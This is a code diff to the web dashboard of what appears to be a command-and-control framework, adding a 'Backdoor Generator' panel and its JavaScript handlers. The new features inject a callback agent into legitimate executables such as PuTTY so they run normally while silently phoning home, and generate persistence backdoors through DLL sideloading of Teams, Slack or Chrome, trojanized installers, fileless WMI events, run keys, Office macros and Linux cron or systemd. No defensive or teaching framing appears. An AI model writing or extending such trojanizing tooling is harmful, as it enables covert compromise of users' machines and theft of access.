@@ -676,6 +676,65 @@ tr.clickable { cursor: pointer; }
           </div>
         </div>
       </div>
+
+      <!-- Backdoor Generator -->
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:14px">
+        <div class="card">
+          <div class="card-header"><h3><span>💉</span> Binary Backdoor</h3></div>
+          <div class="card-body padded">
+            <p style="font-size:12px;color:var(--text-muted);margin-bottom:14px">Inject Phantom agent into a legitimate executable. The original app runs normally + agent calls back silently.</p>
+            <div style="margin-bottom:10px">
+              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Input Binary Path</label>
+              <input type="text" id="bd-input" placeholder="C:\Program Files\PuTTY\putty.exe" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace">
+            </div>
+            <div style="margin-bottom:10px">
+              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Listener (Callback)</label>
+              <select id="bd-listener" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;margin-bottom:6px">
+                <option value="">-- Select listener --</option>
+              </select>
+              <input type="text" id="bd-url" placeholder="http://172.20.41.154:8080" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace">
+            </div>
+            <div style="margin-bottom:10px">
+              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Output Path (optional)</label>
+              <input type="text" id="bd-output" placeholder="auto-generated" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace">
+            </div>
+            <button onclick="backdoorBinary()" class="btn" style="width:100%;padding:12px;font-size:14px">💉 Backdoor Binary</button>
+            <div id="bd-result" style="margin-top:10px;font-size:13px"></div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><h3><span>🔓</span> Persistence Backdoors</h3></div>
+          <div class="card-body padded">
+            <p style="font-size:12px;color:var(--text-muted);margin-bottom:14px">Generate persistence scripts for Windows and Linux targets.</p>
+            <div style="margin-bottom:10px">
+              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Backdoor Type</label>
+              <select id="bd-type" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px">
+                <option value="dll-sideload">DLL Sideloading (Teams, Slack, Chrome...)</option>
+                <option value="lnk">LNK Shortcut Backdoor</option>
+                <option value="installer">Installer Wrapper (Trojanized Setup)</option>
+                <option value="service-dll">Windows Service DLL</option>
+                <option value="registry">Registry Run Key</option>
+                <option value="schtask">Scheduled Task (every 15min)</option>
+                <option value="wmi">WMI Event (fileless)</option>
+                <option value="office-template">Office Template Macro</option>
+                <option value="startup">Startup Folder VBScript</option>
+                <option value="bashrc">Linux Bash RC + Cron + Systemd</option>
+              </select>
+            </div>
+            <div style="margin-bottom:10px">
+              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Target App (for DLL/LNK)</label>
+              <input type="text" id="bd-target-app" placeholder="teams, chrome, slack, notepad..." style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px">
+            </div>
+            <div style="margin-bottom:10px">
+              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Listener URL</label>
+              <input type="text" id="bd-persist-url" placeholder="http://172.20.41.154:8080" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace">
+            </div>
+            <button onclick="generatePersistBackdoor()" class="btn" style="width:100%;padding:12px;font-size:14px">🔓 Generate Backdoor</button>
+            <div id="bd-persist-result" style="margin-top:10px;font-size:13px"></div>
+          </div>
+        </div>
+      </div>
     </div>
 
     <!-- ══════ FILES / SCREENSHOTS / PROCESSES ══════ -->
@@ -1788,6 +1847,7 @@ async function loadPresets() {
     const presets = await fetchJ('/api/presets');
     window._cachedPresets = presets;
     populateListenerSelector();
+    populateBackdoorListeners();
     if (!presets || presets.length === 0) {
       container.innerHTML = '<div style="color:var(--text-muted);font-size:13px;padding:12px;text-align:center;">No saved presets.<br><span style="font-size:11px;">Create a listener and save it as a preset for quick reuse.</span></div>';
       return;
@@ -1960,6 +2020,85 @@ async function generatePayload() {
   btn.textContent = 'Generate Payload';
   btn.disabled = false;
 }
+
+// ──── Binary Backdoor ────
+async function backdoorBinary() {
+  const input = document.getElementById('bd-input').value.trim();
+  const url = document.getElementById('bd-url').value.trim();
+  const output = document.getElementById('bd-output').value.trim();
+  const result = document.getElementById('bd-result');
+
+  if (!input || !url) { alert('Input binary path and listener URL are required'); return; }
+
+  result.innerHTML = '<span style="color:var(--yellow)">Backdooring binary...</span>';
+
+  try {
+    const resp = await fetch('/api/payload/backdoor/binary', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({input:input, listener_url:url, output:output||''})
+    });
+    const data = await resp.json();
+    if (data.error) {
+      result.innerHTML = '<span style="color:var(--red)">Error: '+data.error+'</span>';
+    } else {
+      result.innerHTML = '<span style="color:var(--green)">Backdoored! '+data.filepath+' ('+data.size+')</span>' +
+        '<br><a href="/api/payload/download?file='+encodeURIComponent(data.filepath)+'" style="color:var(--cyan);font-size:12px">Download</a>';
+    }
+  } catch(e) { result.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
+}
+
+async function generatePersistBackdoor() {
+  const type = document.getElementById('bd-type').value;
+  const url = document.getElementById('bd-persist-url').value.trim();
+  const app = document.getElementById('bd-target-app').value.trim();
+  const result = document.getElementById('bd-persist-result');
+
+  if (!url) { alert('Listener URL required'); return; }
+
+  result.innerHTML = '<span style="color:var(--yellow)">Generating...</span>';
+
+  try {
+    const resp = await fetch('/api/payload/backdoor', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({type:type, listener_url:url, target_app:app})
+    });
+    const data = await resp.json();
+    if (data.error) {
+      result.innerHTML = '<span style="color:var(--red)">Error: '+data.error+'</span>';
+    } else {
+      result.innerHTML = '<span style="color:var(--green)">Generated: '+data.filepath+'</span>' +
+        '<br><a href="/api/payload/download?file='+encodeURIComponent(data.filepath)+'" style="color:var(--cyan);font-size:12px">Download</a>';
+    }
+  } catch(e) { result.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
+}
+
+// Populate backdoor listener selectors
+function populateBackdoorListeners() {
+  const sel = document.getElementById('bd-listener');
+  if (!sel) return;
+  let opts = '<option value="">-- Select listener --</option>';
+  if (window._cachedListeners) {
+    window._cachedListeners.forEach(l => {
+      if (l.status === 'running') {
+        const proto = l.type === 'HTTPS' ? 'https' : 'http';
+        const url = proto + '://' + l.bind;
+        opts += '<option value="'+url+'">'+l.name+' ('+url+')</option>';
+      }
+    });
+  }
+  if (window._cachedPresets) {
+    window._cachedPresets.forEach(p => {
+      const proto = p.type === 'https' ? 'https' : 'http';
+      const url = proto + '://' + p.bind;
+      opts += '<option value="'+url+'">'+p.name+' ('+url+')</option>';
+    });
+  }
+  sel.innerHTML = opts;
+}
+
+document.getElementById('bd-listener').addEventListener('change', function() {
+  if (this.value) document.getElementById('bd-url').value = this.value;
+});
 
 // ──── Pivot Graph (Canvas) ────
 function drawPivotGraph() {
